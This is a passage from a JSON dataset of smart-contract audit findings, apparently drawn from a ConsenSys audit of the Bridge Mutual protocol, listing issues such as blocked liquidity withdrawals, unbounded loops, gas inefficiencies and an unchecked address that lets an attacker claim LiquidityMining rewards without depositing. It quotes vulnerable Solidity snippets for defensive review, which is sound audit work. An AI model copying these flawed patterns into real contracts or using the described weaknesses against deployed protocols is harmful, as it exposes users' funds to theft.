      "summary": "\nThis bug report focuses on the issue of the `totalCoverTokens` being decreased right after the policy duration ends. This is due to two sections of code in the PolicyBook.sol contract. The first section of code sets the policyHolders, epochAmounts and totalCoverTokens when the policy ends, while the second section of code decreases the totalCoverTokens for each epoch. \n\nThe issue arises when a claim can be created while the policy is still active, but the liquidity provider can potentially withdraw all of their funds before the claim is created and voted on. This causes the claim to fail. \n\nThe recommendation is to make sure there will always be enough funds for the claim. This can be done by ensuring the liquidity provider cannot withdraw their funds until the claim is created and voted on.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "ConsenSys",
      "protocol_name": "Bridge Mutual",
      "source_link": "https://consensys.net/diligence/audits/2021/03/bridge-mutual/",
      "github_link": "",
      "tags": [],
      "finders": [
        "Daniel Luca",
        "Sergii Kravchenko"
      ]
    },
    {
      "id": "13506",
      "title": "Liquidity withdrawal can be blocked",
      "impact": "HIGH",
      "content": "#### Description\n\n\nThe main problem in that issue is that the liquidity provider may face many potential issues when withdrawing the liquidity. Under some circumstances, a normal user will never be able to withdraw the liquidity. This issue consists of multiple factors that are interconnected and share the same solution.\n\n\n* **There are no partial withdrawals when in the queue**.\nWhen the withdrawal request is added to the queue, it can only be processed fully:\n\n\n**code\\_new/contracts/PolicyBook.sol:L444-L451**\n\n\n\n```\naddress \\_currentAddr = withdrawalQueue.head();\nuint256 \\_tokensToWithdraw = withdrawalsInfo[\\_currentAddr].withdrawalAmount;\n \nuint256 \\_amountInDAI = convertDAIXtoDAI(\\_tokensToWithdraw);\n \nif (\\_availableLiquidity < \\_amountInDAI) {\n  break;\n}\n\n```\nBut when the request is not in the queue, it can still be processed partially, and the rest of the locked tokens will wait in the queue.\n\n\n**code\\_new/contracts/PolicyBook.sol:L581-L590**\n\n\n\n```\n} else if (\\_availableLiquidity < convertDAIXtoDAI(\\_tokensToWithdraw)) {\n  uint256 \\_availableDAIxTokens = convertDAIToDAIx(\\_availableLiquidity);\n  uint256 \\_currentWithdrawalAmount = \\_tokensToWithdraw.sub(\\_availableDAIxTokens);\n  withdrawalsInfo[\\_msgSender()].withdrawalAmount = \\_currentWithdrawalAmount;\n \n  aggregatedQueueAmount = aggregatedQueueAmount.add(\\_currentWithdrawalAmount);\n  withdrawalQueue.push(\\_msgSender());\n \n  \\_withdrawLiquidity(\\_msgSender(), \\_availableDAIxTokens);\n} else {\n\n```\nIf there’s a huge request in the queue, it can become a bottleneck that does not allow others to withdraw even if there is enough free liquidity.\n* **Withdrawals can be blocked forever by the bots**.\n\n\nThe withdrawal can only be requested if there are enough free funds in the contract. But once these funds appear, the bots can instantly buy a policy, and for the normal users, it will be impossible to request the withdrawal. Even when a withdrawal is requested and then in the queue, the same problem appears at that stage.\n* **The policy can be bought even if there are pending withdrawals in the queue**.\n\n\n#### Recommendation\n\n\nOne of the solutions would be to implement the following changes, but the team should thoroughly consider them:\n\n\n* Allow people to request the withdrawal even if there is not enough liquidity at the moment.\n* Do not allow people to buy policies if there are pending withdrawals in the queue and cannot be executed.\n* (Optional) Even when the queue is empty, do not allow people to buy policies if there is not enough liquidity for the pending requests (that are not yet in the queue).\n* (Optional if the points above are implemented) Allow partial executions of the withdrawals in the queue.",
      "summary": "\nThis bug report is about an issue with liquidity provider withdrawals. Under certain circumstances, a user may not be able to withdraw their liquidity. This is due to multiple factors, such as not being able to do partial withdrawals when in the queue, the bots blocking withdrawals forever, and the policy being able to be bought even when there are pending withdrawals in the queue.\n\nThe team is recommended to implement changes to allow people to request withdrawals even if there is not enough liquidity, not allow people to buy policies if there are pending withdrawals in the queue, and allow partial executions of the withdrawals in the queue. These changes should be thoroughly considered before being implemented.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "ConsenSys",
      "protocol_name": "Bridge Mutual",
      "source_link": "https://consensys.net/diligence/audits/2021/03/bridge-mutual/",
      "github_link": "",
      "tags": [],
      "finders": [
        "Daniel Luca",
        "Sergii Kravchenko"
      ]
    },
    {
      "id": "13505",
      "title": "Anyone can win all the funds from the LiquidityMining without investing any DAI",
      "impact": "HIGH",
      "content": "#### Description\n\n\nWhen a user decides to `investDAI` in the `LiquidityMining` contract, the policy book address is passed as a parameter:\n\n\n**code\\_new/contracts/LiquidityMining.sol:L198**\n\n\n\n```\nfunction investDAI(uint256 \\_tokensAmount, address \\_policyBookAddr) external override {\n\n```\nBut this parameter is never checked and only used at the end of the function:\n\n\n**code\\_new/contracts/LiquidityMining.sol:L223**\n\n\n\n```\nIPolicyBook(\\_policyBookAddr).addLiquidityFromLM(msg.sender, \\_tokensAmount);\n\n```\nThe attacker can pass the address of a simple multisig that will process this transaction successfully without doing anything. And pretend to invest a lot of DAI without actually doing that to win all the rewards in the `LiquidityMining` contract.\n\n\n#### Recommendation\n\n\nCheck that the pool address is valid.",
      "summary": "\nThis bug report describes a vulnerability in the LiquidityMining contract of a codebase. When a user decides to investDAI in the contract, they must pass a policy book address as a parameter. However, this parameter is not checked and is only used at the end of the function. This means that an attacker can pass the address of a simple multisig and pretend to invest a lot of DAI without actually doing that, allowing them to win all the rewards in the LiquidityMining contract. The recommendation is to check that the pool address is valid.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "ConsenSys",
      "protocol_name": "Bridge Mutual",
      "source_link": "https://consensys.net/diligence/audits/2021/03/bridge-mutual/",
      "github_link": "",
      "tags": [],
      "finders": [
        "Daniel Luca",
        "Sergii Kravchenko"
      ]
    },
    {
      "id": "13504",
      "title": "Computing the quote should be done for a positive amount of tokens ✓ Fixed",
      "impact": "LOW",
      "content": "#### Description\n\n\nWhen a policy is bought, a quote is requested from the `PolicyQuote` contract.\n\n\n**code/contracts/PolicyBook.sol:L191-L195**\n\n\n\n```\nfunction \\_buyPolicyFor(\n  address \\_policyHolderAddr,\n  uint256 \\_epochsNumber,\n  uint256 \\_coverTokens\n) internal {\n\n```\n**code/contracts/PolicyBook.sol:L213**\n\n\n\n```\nuint256 \\_totalPrice = policyQuote.getQuote(\\_totalSeconds, \\_coverTokens, address(this));\n\n```\nThe `getQuote` call is then forwarded to an internal function\n\n\n**code/contracts/PolicyQuote.sol:L39-L43**\n\n\n\n```\nfunction getQuote(uint256 \\_durationSeconds, uint256 \\_tokens, address \\_policyBookAddr)\n  external view override returns (uint256 \\_daiTokens)\n{\n  \\_daiTokens = \\_getQuote(\\_durationSeconds, \\_tokens, \\_policyBookAddr);\n}\n\n```\n**code/contracts/PolicyQuote.sol:L45-L47**\n\n\n\n```\nfunction \\_getQuote(uint256 \\_durationSeconds, uint256 \\_tokens, address \\_policyBookAddr)\n  internal view returns (uint256)\n{\n\n```\nThere are some basic checks that make sure the total covered tokens with the requested quote do not exceed the total liquidity. On top of that check, it makes sure the total liquidity is positive.\n\n\n**code/contracts/PolicyQuote.sol:L52-L53**\n\n\n\n```\nrequire(\\_totalCoverTokens.add(\\_tokens) <= \\_totalLiquidity, \"PolicyBook: Requiring more than there exists\");\nrequire(\\_totalLiquidity > 0, \"PolicyBook: The pool is empty\");\n\n```\nBut there is no check for the number of quoted tokens. It should also be positive.\n\n\n#### Recommendation\n\n\nAdd an additional check for the number of quoted tokens to be positive. The check could fail or return 0, depending on your use case.\n\n\nIf you add a check for the number of quoted tokens to be positive, the check for `_totalLiquidity` to be positive becomes obsolete and can be removed.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "ConsenSys",
      "protocol_name": "Bridge Mutual",
      "source_link": "https://consensys.net/diligence/audits/2021/03/bridge-mutual/",
      "github_link": "",
      "tags": [],
      "finders": [
        "Daniel Luca",
        "Sergii Kravchenko"
      ]
    },
    {
      "id": "13503",
      "title": "Optimize gas costs when handling liquidity start and end times",
      "impact": "LOW",
      "content": "#### Description\n\n\nWhen the `LiquidityMining` contract is deployed, `startLiquidityMiningTime` saves the current block timestamp.\n\n\n**code/contracts/LiquidityMining.sol:L46**\n\n\n\n```\nstartLiquidityMiningTime = block.timestamp;       \n\n```\nThis value is never changed.\n\n\nThere also exists an end limit calculated by `getEndLMTime`.\n\n\n**code/contracts/LiquidityMining.sol:L271-L273**\n\n\n\n```\nfunction getEndLMTime() public view override returns (uint256) {\n    return startLiquidityMiningTime.add(2 weeks);\n}\n\n```\nThis value is also fixed, once the start was defined.\n\n\nNone of the values change after the contract was deployed. This is why you can use the [immutable feature provided by Solidity](https://docs.soliditylang.org/en/latest/contracts.html#constant-and-immutable-state-variables).\n\n\nIt will reduce costs significantly.\n\n\n#### Examples\n\n\n\n```\ncontract A {\n    uint public immutable start;\n    uint public immutable end;\n   \n    constructor() {\n        start = block.timestamp;\n        end = block.timestamp + 2 weeks;\n    }\n}\n\n```\nThis contract defines 2 variables: `start` and `end` and their value is fixed on deploy and cannot be changed.\n\n\nIt does not need to use `SafeMath` because there’s no risk of overflowing.\n\n\nSetting `public` on both variables creates getters, and calling `A.start()` and `A.end()` returns the respective values.\n\n\nHaving set as immutable does not request EVM storage and makes them very cheap to access.\n\n\n#### Recommendation\n\n\nUse Solidity’s immutable feature to reduce gas costs and rename variables for consistency.\n\n\nUse the example for inspiration.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "ConsenSys",
      "protocol_name": "Bridge Mutual",
      "source_link": "https://consensys.net/diligence/audits/2021/03/bridge-mutual/",
      "github_link": "",
      "tags": [],
      "finders": [
        "Daniel Luca",
        "Sergii Kravchenko"
      ]
    },
    {
      "id": "13502",
      "title": "Save some gas when looping over state arrays ✓ Fixed",
      "impact": "LOW",
      "content": "#### Resolution\n\n\n\nFixed by caching array state length in a local variable.\n\n\n#### Description\n\n\nThere are a few loops over state arrays in `LiquidutyMining`.\n\n\n**code/contracts/LiquidityMining.sol:L209**\n\n\n\n```\nfor (uint256 i = 0; i < leaderboard.length; i++) {\n\n```\n**code/contracts/LiquidityMining.sol:L217**\n\n\n\n```\nfor (uint256 i = 0; i < topUsers.length; i++) {\n\n```\nConsider caching the length in a local variable to reduce gas costs.\n\n\n#### Examples\n\n\nSimilar to\n\n\n**code/contracts/LiquidityMining.sol:L107**\n\n\n\n```\nuint256 \\_usersNumber = allUsers.length;\n\n```\n**code/contracts/LiquidityMining.sol:L110**\n\n\n\n```\nfor (uint256 i = 0; i < \\_usersNumber; i++) {\n\n```\n#### Recommendation\n\n\nReduce gas cost by caching array state length in a local variable.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "ConsenSys",
      "protocol_name": "Bridge Mutual",
      "source_link": "https://consensys.net/diligence/audits/2021/03/bridge-mutual/",
      "github_link": "",
      "tags": [],
      "finders": [
        "Daniel Luca",
        "Sergii Kravchenko"
      ]
    },
    {
      "id": "13501",
      "title": "Methods return values that are never used ✓ Fixed",
      "impact": "LOW",
      "content": "#### Description\n\n\nWhen a user calls `investDAI` these 3 methods are called internally:\n\n\n**code/contracts/LiquidityMining.sol:L196-L198**\n\n\n\n```\n\\_updateTopUsers();\n\\_updateLeaderboard(\\_userTeamInfo.teamAddr);\n\\_updateGroupLeaders(\\_userTeamInfo.teamAddr);\n\n```\nEach method returns a boolean, but the value is never used. It is also unclear what the value should represent.\n\n\n#### Recommendation\n\n\nRemove the returned variable or use it in method `investDAI`.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "ConsenSys",
      "protocol_name": "Bridge Mutual",
      "source_link": "https://consensys.net/diligence/audits/2021/03/bridge-mutual/",
      "github_link": "",
      "tags": [],
      "finders": [
        "Daniel Luca",
        "Sergii Kravchenko"
      ]
    },
    {
      "id": "13500",
      "title": "Optimize gas usage when checking max length of arrays ✓ Fixed",
      "impact": "LOW",
      "content": "#### Description\n\n\nThere are a few cases where some arrays have to be limited to a number of items.\n\n\nAnd the max size is enforced by removing the last item if the array reached max size + 1.\n\n\n**code/contracts/LiquidityMining.sol:L386-L388**\n\n\n\n```\nif (leaderboard.length == MAX\\_LEADERBOARD\\_SIZE.add(1)) {\n    leaderboard.pop();\n}\n\n```\n**code/contracts/LiquidityMining.sol:L439-L441**\n\n\n\n```\nif (topUsers.length == MAX\\_TOP\\_USERS\\_SIZE.add(1)) {\n    topUsers.pop();\n}\n\n```\n**code/contracts/LiquidityMining.sol:L495-L497**\n\n\n\n```\nif (\\_addresses.length == MAX\\_GROUP\\_LEADERS\\_SIZE.add(1)) {\n    groupsLeaders[\\_referralLink].pop();\n}\n\n```\nA simpler and cheaper way to check if an item should be removed is to change the condition to\n\n\n\n```\nif (limitedSizedArray.length > MAX\\_DEFINED\\_SIZE\\_FOR\\_ARRAY) {\n    limitedSizedArray.pop();\n}\n\n```\nThis check does not need or do a SafeMath call (which is more expensive), and because of the limited number of items, as well as a practical impossibility to add enough items to overflow the limit, makes it a preferred way to check the maximum limit.\n\n\n#### Recommendation\n\n\nRewrite the checks and remove SafeMath operations, as well as the addition by 1 and change the check to a “greater than” verification.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "ConsenSys",
      "protocol_name": "Bridge Mutual",
      "source_link": "https://consensys.net/diligence/audits/2021/03/bridge-mutual/",
      "github_link": "",
      "tags": [],
      "finders": [
        "Daniel Luca",
        "Sergii Kravchenko"
      ]
    },
    {
      "id": "13499",
      "title": "The withdrawal queue is only updated when the liquidity is added ✓ Fixed",
      "impact": "MEDIUM",
      "content": "#### Resolution\n\n\n\nThe queue is now updated via the `external` function `updateWithdrawalQueue` but can only be called separately.\n\n\n#### Description\n\n\nSometimes when the amount of liquidity is not much higher than the number of tokens locked for the collateral, it’s impossible to withdraw liquidity. For a user that wants to withdraw liquidity, a withdrawal request is created. If the request can’t be executed, it’s added to the withdrawal queue, and the user needs to wait until there’s enough collateral for withdrawal. There are potentially 2 ways to achieve that: either someone adds more liquidity or some existing policies expire.\n\n\nCurrently, the queue can only be cleared when the internal `_updateWithdrawalQueue`  function is called. And it is only called in one place while adding liquidity:\n\n\n**code/contracts/PolicyBook.sol:L276-L290**\n\n\n\n```\nfunction \\_addLiquidityFor(address \\_liquidityHolderAddr, uint256 \\_liquidityAmount, bool \\_isLM) internal {\n  daiToken.transferFrom(\\_liquidityHolderAddr, address(this), \\_liquidityAmount);   \n  \n  uint256 \\_amountToMint = \\_liquidityAmount.mul(PERCENTAGE\\_100).div(getDAIToDAIxRatio());\n  totalLiquidity = totalLiquidity.add(\\_liquidityAmount);\n  \\_mintERC20(\\_liquidityHolderAddr, \\_amountToMint);\n\n  if (\\_isLM) {\n    liquidityFromLM[\\_liquidityHolderAddr] = liquidityFromLM[\\_liquidityHolderAddr].add(\\_liquidityAmount);\n  }\n\n  \\_updateWithdrawalQueue();\n\n  emit AddLiquidity(\\_liquidityHolderAddr, \\_liquidityAmount, totalLiquidity);\n}\n\n```\n#### Recommendation\n\n\nIt would be better if the queue could be processed when some policies expire without adding new liquidity. For example, there may be an external function that allows users to process the queue.",
      "summary": "\nThe bug report describes an issue with the withdrawal queue in a liquidity system. When the amount of liquidity is not much higher than the number of tokens locked for the collateral, it is impossible for users to withdraw liquidity. To resolve this issue, a withdrawal request is created and added to the withdrawal queue, and the user needs to wait until there is enough collateral for withdrawal. Currently, the queue can only be cleared when the internal `_updateWithdrawalQueue` function is called, which is only called in one place while adding liquidity. The recommendation is to create an external function that allows users to process the queue without adding new liquidity, such as when some policies expire.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "ConsenSys",
      "protocol_name": "Bridge Mutual",
      "source_link": "https://consensys.net/diligence/audits/2021/03/bridge-mutual/",
      "github_link": "",
      "tags": [],
      "finders": [
        "Daniel Luca",
        "Sergii Kravchenko"
      ]
    },
    {
      "id": "13498",
      "title": "Withdrawal with zero amount is possible ✓ Fixed",
      "impact": "MEDIUM",
      "content": "#### Resolution\n\n\n\nThe `_tokensToWithdraw`  can now only be >0.\n\n\n#### Description\n\n\nWhen creating a withdrawal request, the amount of tokens to withdraw is passed as a parameter:\n\n\n**code/contracts/PolicyBook.sol:L358**\n\n\n\n```\nfunction requestWithdrawal(uint256 \\_tokensToWithdraw) external override {\n\n```\nThe problem is that this parameter can be zero, and the function will be successfully executed. Moreover, this request can then be added to the queue, and the actual withdrawal will also be executed with zero value. Addresses that never added any liquidity could spam the system with these requests.\n\n\n#### Recommendation\n\n\nDo not allow withdrawals of zero tokens.",
      "summary": "\nThis bug report describes an issue in the PolicyBook.sol contract, which allows users to request a withdrawal of tokens. The problem is that the parameter for the amount of tokens to withdraw can be set to zero, allowing users to spam the system with requests for zero tokens. To fix this issue, it is recommended that withdrawals of zero tokens should not be allowed. The resolution is that the `_tokensToWithdraw` parameter can now only be greater than zero.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "ConsenSys",
      "protocol_name": "Bridge Mutual",
      "source_link": "https://consensys.net/diligence/audits/2021/03/bridge-mutual/",
      "github_link": "",
      "tags": [],
      "finders": [
        "Daniel Luca",
        "Sergii Kravchenko"
      ]
    },
    {
      "id": "13497",
      "title": "The _removeFromQueue is very gas greedy ✓ Fixed",
      "impact": "MEDIUM",
      "content": "#### Resolution\n\n\n\nThe queue structure has changed significantly and became more optimized. On the other hand, the new structure has some overhead and can be simplified to optimize more gas.\n\n\n#### Description\n\n\nThe `_removeFromQueue` function is supposed to remove `_countToRemove` elements from the queue:\n\n\n**code/contracts/PolicyBook.sol:L296-L313**\n\n\n\n```\nfunction \\_removeFromQueue(uint256 \\_countToRemove) internal {\n  for (uint256 i = 0; i < \\_countToRemove; i++) {\n    delete withdrawalsInfo[withdrawalQueue[i]];\n  }   \n\n  if (\\_countToRemove == withdrawalQueue.length) {\n    delete withdrawalQueue;\n  } else {\n    uint256 \\_remainingArrLength = withdrawalQueue.length.sub(\\_countToRemove);\n    address[] memory \\_remainingArr = new address[](\\_remainingArrLength);\n\n    for (uint256 i = 0; i < \\_remainingArrLength; i++) {\n      \\_remainingArr[i] = withdrawalQueue[i.add(\\_countToRemove)];\n    }\n\n    withdrawalQueue = \\_remainingArr;\n  }\n}\n\n```\nThis function uses too much gas, which makes it easier to make attacks on the system. Even if only one request is removed and executed, this function rewrites all the requests to the storage.\n\n\n#### Recommendation\n\n\nThe data structure should be changed so this function shouldn’t rewrite the requests that did not change.\nFor example, it can be a mapping `(unit => address)` with 2 indexes `(start, end)` that are only increasing.",
      "summary": "\nThis bug report is about a function called `_removeFromQueue` in the PolicyBook.sol file. This function is supposed to remove a certain number of elements from a queue, but it is using too much gas. This makes it easier to attack the system, even when only one request is removed. The recommendation is to change the data structure so that requests that did not change do not need to be rewritten. A possible solution is to use a mapping with two indexes, start and end, that are only increasing.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "ConsenSys",
      "protocol_name": "Bridge Mutual",
      "source_link": "https://consensys.net/diligence/audits/2021/03/bridge-mutual/",
      "github_link": "",
      "tags": [],
      "finders": [
        "Daniel Luca",
        "Sergii Kravchenko"
      ]
    },
    {
      "id": "13496",
      "title": "Unbounded loops in LiquidityMining ✓ Fixed",
      "impact": "MEDIUM",
      "content": "#### Resolution\n\n\n\nFixed by adding the limits.\n\n\n#### Description\n\n\nThere are some methods that have unbounded loops and will fail when enough items exist in the arrays.\n\n\n**code/contracts/LiquidityMining.sol:L83**\n\n\n\n```\nfor (uint256 i = 0; i < \\_teamsNumber; i++) {\n\n```\n**code/contracts/LiquidityMining.sol:L97**\n\n\n\n```\nfor (uint256 i = 0; i < \\_membersNumber; i++) {\n\n```\n**code/contracts/LiquidityMining.sol:L110**\n\n\n\n```\nfor (uint256 i = 0; i < \\_usersNumber; i++) {\n\n```\nThese methods will fail when lots of items will be added to them.\n\n\n#### Recommendation\n\n\nConsider adding limits (from, to) when requesting the items.",
      "summary": "\nThis bug report is about a problem with some methods in the code/contracts/LiquidityMining.sol file. These methods contain unbounded loops which will fail when too many items are added to the arrays. The recommendation is to add limits (from, to) when requesting the items, and the bug has been fixed by doing this.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "ConsenSys",
      "protocol_name": "Bridge Mutual",
      "source_link": "https://consensys.net/diligence/audits/2021/03/bridge-mutual/",
      "github_link": "",
      "tags": [],
      "finders": [
        "Daniel Luca",
        "Sergii Kravchenko"
      ]
    },
    {
      "id": "13495",
      "title": "The totalCoverTokens is only updated when the policy is bought ✓ Fixed",
      "impact": "MEDIUM",
      "content": "#### Resolution\n\n\n\nThe `updateEpochsInfo` function is now public and can be called by anyone.\n\n\n#### Description\n\n\nThe `totalCoverTokens` value represents the amount of collateral that needs to be locked in the policy book. It should be changed either by buying a new policy or when an old policy expires. The problem is that when the old policy expires, this value is not updated; it is only updated when someone buys a policy by calling the `_updateEpochsInfo`  function:\n\n\n**code/contracts/PolicyBook.sol:L240-L251**\n\n\n\n```\nfunction \\_updateEpochsInfo() internal {\n  uint256 \\_totalEpochTime = block.timestamp.sub(epochStartTime);\n  uint256 \\_countOfPassedEpoch = \\_totalEpochTime.div(epochDuration);\n\n  uint256 \\_lastEpochUpdate = currentEpochNumber;\n  currentEpochNumber = \\_countOfPassedEpoch.add(1);\n\n  for (uint256 i = \\_lastEpochUpdate; i < currentEpochNumber; i++) {\n    totalCoverTokens = totalCoverTokens.sub(epochAmounts[i]);\n    delete epochAmounts[i];\n  }\n}\n\n```\nUsers waiting to withdraw liquidity should wait for someone to buy the policy to update the `totalCoverTokens`.\n\n\n#### Recommendation\n\n\nMake sure it’s possible to call the `_updateEpochsInfo` function without buying a new policy.",
      "summary": "\nThe bug report describes a problem with the `totalCoverTokens` value not being updated when an old policy expires. This value represents the amount of collateral that needs to be locked in the policy book and should be updated when an old policy expires. The problem is that this value is only updated when someone buys a policy by calling the `_updateEpochsInfo` function. As a result, users waiting to withdraw liquidity have to wait for someone to buy the policy to update the `totalCoverTokens` value. To resolve this issue, the `_updateEpochsInfo` function has been made public and can now be called by anyone. This will ensure that the `totalCoverTokens` value is updated without having to buy a new policy.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "ConsenSys",
      "protocol_name": "Bridge Mutual",
      "source_link": "https://consensys.net/diligence/audits/2021/03/bridge-mutual/",
      "github_link": "",
      "tags": [],
      "finders": [
        "Daniel Luca",
        "Sergii Kravchenko"
      ]
    },
    {
      "id": "13494",
      "title": "Premium is payed instantly to the liquidity providers ✓ Fixed",
      "impact": "MEDIUM",
      "content": "#### Resolution\n\n\n\nThe premium is now distributed on a daily basis.\n\n\n#### Description\n\n\nWhen the policy is bought, the premium is transferred to the PolicyBook instantly. Currently, these funds are not going to the liquidity providers as a reward due to the [issue 5.3](#profit-and-loss-distribution-mechanism-is-not-working). But when the issue is fixed, it seems like the premium is paid and distributed as a reward instantly when the policy is purchased.\n\n\nThe problem is that if someone buys the policy for a long period of time, every liquidity provider instantly gets the premium from the full period. If there’s enough liquidity, any provider can withdraw the funds after that without taking a risk for this period.\n\n\n#### Recommendation\n\n\nDistribute the premium over time. For example, increase the reward after each epoch.",
      "summary": "\nThis bug report concerns the distribution of premiums when a policy is bought via PolicyBook. Currently, the premium is transferred to the liquidity providers instantly, which can create a situation where a provider can withdraw the funds without taking a risk for the period. The resolution proposed is to distribute the premium over time, increasing the reward after each epoch. This would ensure that the liquidity providers are taking on the risk for the period, thus preventing any potential issues.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "ConsenSys",
      "protocol_name": "Bridge Mutual",
      "source_link": "https://consensys.net/diligence/audits/2021/03/bridge-mutual/",
      "github_link": "",
      "tags": [],
      "finders": [
        "Daniel Luca",
        "Sergii Kravchenko"
      ]
    },
    {
      "id": "13493",
      "title": "The PolicyBook should make DAI transfers inside the contract ✓ Fixed",
      "impact": "MEDIUM",
      "content": "#### Resolution\n\n\n\nThe `PolicyBook` contract does not give the DAI allowance to anyone and token transfers are now done from the `PolicyBook` contract.\n\n\n#### Description\n\n\nThe `PolicyBook` contract gives full allowance over DAI tokens to the other contracts:\n\n\n**code/contracts/PolicyBook.sol:L120-L125**\n\n\n\n```\nfunction approveAllDaiTokensForStakingAndVotingAndTransferOwnership() internal {\n  daiToken.approve(address(bmiDaiStaking), MAX\\_INT);   \n  daiToken.approve(address(claimVoting), MAX\\_INT);    \n\n  transferOwnership(address(bmiDaiStaking));\n}\n\n```\nThat behavior is dangerous because it’s hard to keep track of and control the contract’s DAI balance. And it’s also hard to track in the code where the balance of the `PolicyBook` can be changed from.\n\n\n#### Recommendation\n\n\nIt’s better to perform all the transfers inside the `PolicyBook` contract. So if the `bmiDaiStaking` and the `claimVoting` contracts need DAI tokens from the `PolicyBook`, they should call some function of the `PolicyBook` to perform transfers.",
      "summary": "\nA bug was found in the `PolicyBook` contract, which allowed full allowance over DAI tokens to other contracts. This behavior is dangerous as it is difficult to keep track of and control the contract’s DAI balance, as well as hard to track in the code where the balance of the `PolicyBook` can be changed from. The recommended resolution is to perform all the transfers inside the `PolicyBook` contract. This means that if the `bmiDaiStaking` and the `claimVoting` contracts need DAI tokens from the `PolicyBook`, they should call some function of the `PolicyBook` to perform transfers.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "ConsenSys",
      "protocol_name": "Bridge Mutual",
      "source_link": "https://consensys.net/diligence/audits/2021/03/bridge-mutual/",
      "github_link": "",
      "tags": [],
      "finders": [
        "Daniel Luca",
        "Sergii Kravchenko"
      ]
    },
    {
      "id": "13492",
      "title": "_updateWithdrawalQueue can run out of gas ✓ Fixed",
      "impact": "HIGH",
      "content": "#### Resolution\n\n\n\nThe `updateWithdrawalQueue`function is now limiting the number of processed withdrawals.\n\n\n#### Description\n\n\nWhen there’s not enough collateral to withdraw liquidity from a policy book, the withdrawal request is added to a queue. The queue is supposed to be processed and cleared once there are enough funds for that. The only way to do so is the `_updateWithdrawalQueue` function that is caller when new liquidity is added:\n\n\n**code/contracts/PolicyBook.sol:L315-L338**\n\n\n\n```\nfunction \\_updateWithdrawalQueue() internal {\n  uint256 \\_availableLiquidity = totalLiquidity.sub(totalCoverTokens);\n  uint256 \\_countToRemoveFromQueue;\n\n  for (uint256 i = 0; i < withdrawalQueue.length; i++) {     \n    uint256 \\_tokensToWithdraw = withdrawalsInfo[withdrawalQueue[i]].amount;\n    uint256 \\_amountInDai = \\_tokensToWithdraw.mul(getDAIToDAIxRatio()).div(PERCENTAGE\\_100);\n\n    if (balanceOf(withdrawalQueue[i]) < \\_tokensToWithdraw) {\n      \\_countToRemoveFromQueue++;\n      continue;\n    }\n\n    if (\\_availableLiquidity >= \\_amountInDai) {\n      \\_withdrawLiquidity(withdrawalQueue[i], \\_tokensToWithdraw);\n      \\_availableLiquidity = \\_availableLiquidity.sub(\\_amountInDai);\n      \\_countToRemoveFromQueue++;\n    } else {\n      break;\n    }\n  }\n\n  \\_removeFromQueue(\\_countToRemoveFromQueue);\n}\n\n```\nThe problem is that this function can only process all queue until the pool run out of available funds or the whole queue is going to be processed. If the queue is big enough, this process can be stuck.\n\n\n#### Recommendation\n\n\nPass the parameter to the `_updateWithdrawalQueue` that defines how many requests to process in the queue per one call.",
      "summary": "\nA bug was discovered in the `updateWithdrawalQueue` function of the PolicyBook.sol contract. This function is called when new liquidity is added and is responsible for processing withdrawal requests from a queue. The problem is that this function can only process all requests in the queue until the pool runs out of available funds or the whole queue is processed. If the queue is large enough, this process can get stuck. \n\nThe resolution is that the `_updateWithdrawalQueue` function now limits the number of processed withdrawals. A recommendation has been made to pass a parameter to the `_updateWithdrawalQueue` that defines how many requests to process in the queue per one call. This parameter will allow the function to process a certain number of requests each time it is called, rather than having to process the entire queue at once.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "ConsenSys",
      "protocol_name": "Bridge Mutual",
      "source_link": "https://consensys.net/diligence/audits/2021/03/bridge-mutual/",
      "github_link": "",
      "tags": [],
      "finders": [
        "Daniel Luca",
        "Sergii Kravchenko"
      ]
    },
    {
      "id": "13491",
      "title": "DAI is assumed to have the same price as DAIx in the staking contract ✓ Fixed",
      "impact": "HIGH",
      "content": "#### Resolution\n\n\n\nFixed by not transferring DAI anymore.\n\n\n#### Description\n\n\nWhen a liquidity provider stakes tokens to the `BMIDAIStaking` contract, the equal amount of DAI and DAIx are transferred from the pool contract.\n\n\n**code/contracts/BMIDAIStaking.sol:L113-L124**\n\n\n\n```\nfunction \\_stakeDAIx(address \\_user, uint256 \\_amount, address \\_policyBookAddr) internal {\n    require (\\_amount > 0, \"BMIDAIStaking: Can't stake zero tokens\");\n\n    PolicyBook \\_policyBook = PolicyBook(\\_policyBookAddr);\n    // transfer DAI from PolicyBook to yield generator\n    daiToken.transferFrom(\\_policyBookAddr, address(defiYieldGenerator), \\_amount);            \n\n    // transfer bmiDAIx from user to staking\n    \\_policyBook.transferFrom(\\_user, address(this), \\_amount);       \n\n    \\_mintNFT(\\_user, \\_amount, \\_policyBook);\n}\n\n```\n#### Recommendation\n\n\nOnly the corresponding amount of DAI should be transferred to the pool.",
      "summary": "\nThis bug report is about the `BMIDAIStaking` contract, which is used by liquidity providers to stake tokens. The bug is that when a liquidity provider stakes tokens to the `BMIDAIStaking` contract, the equal amount of DAI and DAIx are transferred from the pool contract. The code/contracts/BMIDAIStaking.sol:L113-L124 is responsible for this bug. \n\nThe recommendation is that only the corresponding amount of DAI should be transferred to the pool. The resolution to this bug is that it has been fixed by not transferring DAI anymore.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "ConsenSys",
      "protocol_name": "Bridge Mutual",
      "source_link": "https://consensys.net/diligence/audits/2021/03/bridge-mutual/",
      "github_link": "",
      "tags": [],
      "finders": [
        "Daniel Luca",
